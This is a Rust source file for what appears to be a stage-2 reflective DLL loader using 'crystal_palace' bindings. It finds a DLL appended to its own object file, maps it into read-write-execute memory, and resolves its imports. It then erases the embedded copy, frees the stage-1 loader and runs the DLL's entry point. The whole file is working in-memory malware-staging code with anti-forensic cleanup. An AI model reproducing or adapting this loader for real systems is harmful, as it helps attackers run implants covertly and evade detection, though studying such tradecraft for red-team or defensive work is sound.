#![no_std]
#![no_main]

#[panic_handler]
fn panic(_info: &core::panic::PanicInfo) -> ! { loop {} }

use core::{mem, ptr::{self, null_mut}};
use crystal_palace_rs::{append_data, get_resource, import};
use crystal_palace_sys::tcg::{DLLDATA, EntryPoint, IMPORTFUNCS, LoadDLL, ParseDLL, ProcessImports, SizeOfDLL};
use winapi::{shared::{basetsd::SIZE_T, minwindef::{DWORD, FARPROC, HMODULE, LPVOID}, ntdef::LPCSTR}, um::winnt::{DLL_PROCESS_ATTACH, MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, PAGE_EXECUTE_READWRITE}};

append_data!(my_data, findAppendedDLL);

import!(KERNEL32!ExitThread(dwExitCode: DWORD) -> !);
import!(VirtualAlloc(lpAddress: LPVOID, dwSize: usize, flAllocationType: DWORD, flProtect: DWORD) -> LPVOID);
import!(VirtualFree(lpAddress: LPVOID, dwSize: SIZE_T, flAllocationType: DWORD) -> i32);
import!(LoadLibraryA(arg1: LPCSTR) -> HMODULE);
import!(GetProcAddress(arg1: HMODULE, arg2: LPCSTR) -> FARPROC);

#[unsafe(no_mangle)]
extern "C" fn go(p_stage1: *const u8) {
    unsafe { 
        let dst;
        let dll_src;
        let mut data: DLLDATA = mem::zeroed();
        let entry;

        /* resolve some needed function pointers */
        let mut funcs = IMPORTFUNCS{ 
            LoadLibraryA: Some(LoadLibraryA_ptr()), 
            GetProcAddress: Some(GetProcAddress_ptr()) 
        };

        /* find our DLL appended to this COFF */
        dll_src = get_resource(findAppendedDLL());

        /* parse our DLL! */
        ParseDLL(dll_src.as_ptr() as _, &mut data);

        /* allocate memory for it! */
        dst = VirtualAlloc(null_mut(), SizeOfDLL(&mut data) as _, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);

        /* load the damned thing */
        LoadDLL(&mut data, dll_src.as_ptr() as _, dst as _);

        /* process the imports */
        ProcessImports(&mut funcs, &mut data, dst as _);

        /* grab our entry point, the last info we need from dllsrc */
        entry = EntryPoint(&mut data, dst as _).unwrap_unchecked();

        /* OK, the way I've done things here, our DLL data is LINKED to this COFF and it was put into the RW memory
         * with this COFF's other global variables (and function table too). We can't free() it. But, we can zero it
         * out and that's what we're going to do here. stage1 could have extracted the DLL as a separate resource
         * and then we could have freed that, but I'm playing with making this modular. So, this is what I got. */
        ptr::write_bytes(dll_src.as_ptr() as *mut u8, 0, dll_src.len());
        
        /* let's free our Stage 1 too */
        VirtualFree(p_stage1 as _, 0, MEM_RELEASE);

        /* run our DLL */
        entry(dst as _, DLL_PROCESS_ATTACH, null_mut());

        /* and, because we can't "return" to our stage 1, let's exit this thread */
        ExitThread(0);
    };
}
